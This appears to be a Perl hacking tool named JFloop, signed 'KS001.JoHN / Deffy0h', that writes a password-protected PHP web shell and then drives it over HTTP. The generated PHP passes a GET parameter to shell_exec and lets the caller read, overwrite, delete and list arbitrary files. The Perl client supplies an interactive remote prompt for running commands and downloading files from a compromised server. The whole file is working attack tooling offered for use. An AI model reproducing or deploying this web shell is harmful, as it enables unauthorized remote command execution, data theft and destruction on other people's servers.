#use strict;
use HTTP::Request;
use LWP::UserAgent;
use Getopt::Long;
use Digest::MD5 qw(md5_hex);
use Term::ReadKey;
use Term::ANSIColor;
use Time::HiRes qw(usleep);

system("clear");

$author="KS001.JoHN";
$github_novo="https://github.com/ks001john";
$github_antigo="https://github.com/Deffy0h";
$antigo="Deffy0h";
$c_email=$author.chr(64)."Gmail.com";
$e_email=$antigo.chr(64)."Gmail.com";
$c_skype="SKYPE : ".$antigo; 
$code="ks.john";
my $OK_HTTP=200;
my $RE_ERRO="ERRO0";

my $help=
"
\t\tHELP COMMANDS
\t\t-=============================-
\t\tls 	- files and folders
\t\tmkdir 	- create folder
\t\topen 	- save file
\t\tdel 	- delete file or folder
\t\tedit 	- edit a file
\t\tcreate 	- create a file
\t\tclear 	- clear terminal
\t\texit 	- exit terminal
\t\tcmd  	- send terminal commands
\t\t
";

print color("bold green");
print <<Eop;


			
	
		   d88b d88888b db       .d88b.   .d88b.  d8888b. 
		   `8P' 88'     88      .8P  Y8. .8P  Y8. 88  `8D 
		    88  88ooo   88      88    88 88    88 88oodD' 
		    88  88~~~   88      88    88 88    88 88~~~   
		db. 88  88      88booo. `8b  d8' `8b  d8' 88      
		Y8888P  YP      Y88888P  `Y88P'   `Y88P'  88      
Eop
print color("reset"); 
print color("blue"); 
print <<t;	                                                  			
			-===================================-
			  Create By $author / $antigo
			  $c_email
			  $e_email
			  $c_skype
			  $github_novo (novo)
			  $github_antigo
			-===================================- 
t
		print color("reset");
		print colored("\t\t\t\tBRAZILIAN HACKING\n","blue");
		print colored("\t\t\t     KSJ-Killer System JoHN\n\n","bold blue"); 

$go="		
		use: JFloop.pl --conn|-c  -connect to shell
                use: JFloop.pl --make|-m  -generate shell
                use: JFloop.pl --help|-h  -get help
                use: JFloop.pl --url |-u  -DNS or URL target(opcional)\n\n";

my $woner = 0;
my $u="";
my $p="";
my $op_network;
my $op_make;
my $auth="";
my $path="";
my $lastFolder="";
my $lj="";
my $hem="";
my $h;
my $cmd;
my $url;

GetOptions(
"m|make"=>\$op_make,
"c|conn"=>\$op_network,
"h|help"=>\$h,
"u|url=s"=>\$url
);

unless($h){
}else{
if($woner>0){
print colored($help,"reset");
}else{
print colored($go,"reset");
}
exit;
}

unless($op_network){
	unless($op_make){
		print color("red");
		#print $go;
		print color("red"); 
		print "\t\t\t[-] use: JFloop.pl --help\n\n";exit;
	}
}else{
	unless($op_make){
}else{
		print color("blue");
		print "\n[*] CONNECTING TO SHELL\n";
		print color("reset");
}
#exit;
}
unless($op_make){
}else{
print color("bold blue");
print "-===================-\n";
print " MAKING A SHELL CODE\n";
print "-===================-\n";
print "\n";
print color("reset");
#exit;
}
unless($op_make){
	unless($op_network){
		print color("bold red");
		print "[-] SELECT A OPTION";exit;
		print color("reset");
	}
}

if($op_network){
CONN();
}else{
CREN();
#print "make"; exit;
}

sub CREN(){
my $file="Shell.php";
print "FILE NAME(Default:$file):> ";
$file=<STDIN>;
chomp($file);
if($file!~m/.php$/){
$file="Shell.php";
}

print "PASSWORD:> ";
$p=<STDIN>;
chomp($p);
unless($p){
print color("bold red");
print "[-] PASSWORD IS EMPTY\n";
print color("reset");
exit;
}

$p=md5_hex($p);

print "\n";
print color("bold green");
print "[+] FILE(name)=> $file\n";
print "[+] [MD5]PASSWORD=> $p\n";
print color("reset");
print "\n\n";
print color("blue");
print "[*] CREATING PHP CODE\n";
print color("reset");

my $ex_password=chr(36)."password";
my $ex_code=chr(36)."code";
my $ex_GET=chr(36)."_GET";
my $ex_p=chr(36)."p";
my $ex_code_=chr(36)."code_";
my $ex_type=chr(36)."type";
my $ex_path=chr(36)."path";
my $ex_cmd=chr(36)."cmd";
my $ex_text=chr(36)."text";
my $ex_f=chr(36)."f";
my $ex_r=chr(36)."r";
my $ex_dir=chr(36)."dir";

my $er_e=chr(91);
my $er_ee=chr(93);

$mmh="
<?php 

#-=================================================-
# Create By KSJ / Deffy0h -Tools:jfloop.pl					
#-=================================================-
# https://github.com/ks001john/JFloop.git
#...................................................

$ex_password='$p';
$ex_code='$code';

#chmod($file,777);

if(!isset($ex_GET $er_e 'p' $er_ee )){exit;}$ex_p=$ex_GET $er_e 'p' $er_ee ;
if(!isset($ex_GET $er_e 'code' $er_ee )){exit;}$ex_code_=$ex_GET $er_e 'code' $er_ee ;
if($ex_code_!=$ex_code){exit;}
if($ex_password!=$ex_p){echo 'ERRO0'; exit;}

if(isset($ex_GET $er_e 'type' $er_ee )){$ex_type=$ex_GET $er_e 'type' $er_ee ;}else{exit;}
if($ex_type=='dir'){
DIR_();
}
if($ex_type=='open'){
OPEN_();
}
if($ex_type=='mkdir'){
MKDIR_();
}
if($ex_type=='del'){
DEL_();
}
if($ex_type=='edit'){
EDIT_();
}
if($ex_type=='cmd'){
CMD_();
}

function CMD_(){
if(!isset($ex_GET $er_e 'cmd' $er_ee )){exit;}$ex_cmd=$ex_GET $er_e 'cmd' $er_ee ;
echo shell_exec($ex_cmd);
}

function EDIT_(){
if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
if(!isset($ex_GET $er_e 'text' $er_ee )){exit;}$ex_text=$ex_GET $er_e 'text' $er_ee ;
$ex_f=fopen($ex_path,'w') or die('e1');
fwrite($ex_f,$ex_text);
fclose($ex_f);
}

function DEL_(){
if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
if(!is_dir($ex_path)){
unlink($ex_path);
exit;
}
rmdir($ex_path);
}

function MKDIR_(){
if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
mkdir($ex_path,773,true);
}

function OPEN_(){
if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
$ex_f=fopen($ex_path,'r') or die('e1');
$ex_r=fread($ex_f,filesize($ex_path));
fclose($ex_f);
echo $ex_r;
}

function DIR_(){
if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
$ex_dir=scandir($ex_path);
print_r($ex_dir);
}

?>
";
print color("blue");
print "[*] MAKING PHP FILE...\n";
#print "[+] ".$file."\n";
print color("reset");

print color("blue");
print "[*] SETTING PHP CODE...\n";
print color("reset");

open($a,">",$file);
$a->print($mmh);
$a->close();

print "[+] ".$file."\n";
print color("bold green");
print "[+] FILE $file SAVED\n\n";
print color("reset");
#sleep(1);
#print "CONNECTING\n";sleep(1);
#print "CONNECTING.\n";sleep(1);
#print "CONNECTING..\n";sleep(1);

my @n = 1 .. 10;
local $| = 1;
print colored("SETTING...    ","bold");
print "[";
foreach my $c (@n){
#print("\b" x length($porcentage));
#my $porcentage = $c * 10;
print("=====" x length($c));
#Time::HiRes->usleep(100000);
usleep(100000);
}
print "]\n";

my @n = 1 .. 10;
local $| = 1;
print colored("CONNECTING... ","bold");
print "[";
foreach my $c (@n){
#print("\b" x length($porcentage));
#my $porcentage = $c * 10;
print("=====" x length($c));
#Time::HiRes->usleep(100000);
usleep(100000);
}
print "]\n";

#system("perl nmuc.pl --conn");
print "\n\n";
CONN();

}

sub CONN(){
unless($url){
print "URL(exemple): target.com/upload/file/shell.php\n";
print "URL: ";
$u=<STDIN>;
chomp($u);
unless($u){
print color("bold red");
print "\n[-] NOT DEFINED URL\n";
print color("reset");
exit;
}
}
if($url ne ""){
$u=$url;
}

if($u!~m/http:/){
$u="http://".$u;
}

$ua = LWP::UserAgent->new;
if($re=HTTP::Request->new(GET=>$u)){
$response=$ua->request($re);
if($response->status_line!=$OK_HTTP){
print color("bold red");
print "\n[-] ERRO\n";
print $response->status_line."\n";
print color("reset");
exit;
}
}

print "PASSWORD:> ";
#system("stty -echo");
ReadMode("noecho");
my $p=<STDIN>;
#$p=Readline(56);
#system("stty echo");
ReadMode("restore");
chomp($p);
unless($p){
print color("bold red");
print "\n[-] NOT DEFINED PASSWORD\n";
print color("reset");
exit;
}

$p=md5_hex($p);

print "\n\n";
print color("blue");
print "[*] OWNER\n";
print color("bold green");
print "[+] URL=> $u\n";
print "[+] PASSWORD=> $p\n";
#print color("reset");

if($u!~m/[?]/){
$u=$u."?";
}

my $ioe="code=".$code."&p=".$p;
$auth=$u.$ioe;

#print color("blue");
print "[+] AUTHENTICATON...\n";
#print color("reset");

if($re=HTTP::Request->new(GET=>$auth)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm!~m/$RE_ERRO/){
print color("bold blue");
print "[!] OK WELCOME\n";
print "\n";
$woner=1;
print color("reset");
}else{
print color("bold red");
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
print color("reset");
exit;
}
}

COMMAND();
}

sub RETN(){
COMMAND();
}

sub COMMAND(){
print "(shell)> ";
my $command=<STDIN>;
chomp($command); 

if($command eq "ls"){
FILES_SERVER();
}
if($command eq "clear"){
CLS();
}
if($command eq "exit"){
EX();
}
if($command eq "open"){
OPEN_FILES();
}
if($command eq "mkdir"){
CREATE_FOLDER();
}
if($command eq "del"){
DEL_();
}
if($command eq "edit"){
EDIT_();
}
if($command eq "create"){
EDIT_();
}
if($command eq "cmd"){
my @n = 1 .. 10;
local $| = 1;
print colored("EXPLOIT... ","bold");
print "[";
foreach my $c (@n){
#print("\b" x length($porcentage));
#my $porcentage = $c * 10;
print("=====" x length($c));
#Time::HiRes->usleep(100000);
usleep(100000);
}
print "]\n";
foreach my $p (@n){
#print("\b" x length($porcentage));
my $pc = $p * 10;
print "$pc";
sleep(1);
print("\b" x length($pc));
}
print colored("[*] SUCCESS","blue");
print "\n\n";
CMD_();
}
if($command eq "help"){
print $help;
}
if($command ne "ls" || $command ne "clear" || $command ne "exit" || $command ne "open" || $command ne "mkdir" || $command ne "del" || $command ne "edit"){RETN();}

}

sub CMD_(){

print "(cmd)"; 
print colored("root","red");
print ">";
$cmd=<STDIN>;
chomp($cmd);

$gh=$auth."&type=cmd&cmd=".$cmd;
#print $gh;
if($re=HTTP::Request->new(GET=>$gh)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm="";
$htm=$response->decoded_content;
if($htm ne ""){
print $htm."\n";
CMD_();
}
}
}
}

sub EDIT_(){

print "PATH=> ";
$path=<STDIN>;
chomp($path);

print "TEXT=> ";
$hem=<STDIN>;
chomp($hem);

$gh=$auth."&type=edit&path=".$path."&text=".$hem;

if($re=HTTP::Request->new(GET=>$gh)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm ne ""){
print "\n\n[+] $path EDITED WITH SUCCESS\n\n";
}
}
}

}

sub DEL_(){

print "PATH=> ";
$path=<STDIN>;
chomp($path);

$delmk=$auth."&type=del&path=".$path;

if($re=HTTP::Request->new(GET=>$delmk)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm!~m/$RE_ERRO/){
print "\n";


print "\n[+] $path DELETED\n";


}else{
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
exit;
}
}
print "\n\n";
RETN();
}

sub FILES_SERVER(){

print "PATH=> ";
$path=<STDIN>;
chomp($path);

if($path!~m/./){
$path="/".$path."/";
}

$u_files=$auth."&type=dir"."&path=".$path;
if($re=HTTP::Request->new(GET=>$u_files)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm!~m/$RE_ERRO/){
if($htm=~/Array/){
print "\n";

$lastFolder=$lastFolder."/".$path;
$lj=$path;

print "[+] PATH=> ".$lastFolder."\n\n";
print $htm;
}else{
print "USE: /folder/ or '/' or '../folder/' or '.'\n";
}
}else{
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
exit;
}
}
print "\n\n";
RETN();
}

sub OPEN_FILES(){

print "FILE=> ";
$path=<STDIN>;
chomp($path);

print "SAVE=> ";
my $save="";
$save=<STDIN>;
chomp($save);
unless($save){
$save="index.php";
}

$uu_files=$auth."&type=open&path=".$path;
chomp($u_files);

if($re=HTTP::Request->new(GET=>$uu_files)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm!~m/$RE_ERRO/){
print "\n";

if($htm!~m/EEE_FD/){

open($a,">",$save);
$a->print($htm);
$a->close();

print "\n[+] FILE $save SAVE\n";

}else{
print "\n[-] FILE NOT EXISTS\n";
}

}else{
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
exit;
}
}
print "\n\n";
RETN();
}

sub CREATE_FOLDER(){

print "PATH=> ";
$path=<STDIN>;
chomp($path);

print "FOLDER=> ";
my $folder="";
$folder=<STDIN>;
chomp($folder);

$uumk_=$auth."&type=mkdir&path=".$path."/".$folder;

if($re=HTTP::Request->new(GET=>$uumk_)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
print $html;
if($htm!~m/$RE_ERRO/){
print "\n";
print "\n[+] FOLDER $folder CREATED\n";
}else{
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
exit;
}
}
print "\n\n";
RETN();
}

sub CLS(){
system("cls");
system("clear");
RETN();
}

sub EX(){exit;}

__END__

-AUTHOR-
KS.JoHN - Killer System JoHN
Deffy0h

-BANNER-
http://www.kammerl.de/ascii/AsciiSignature.php
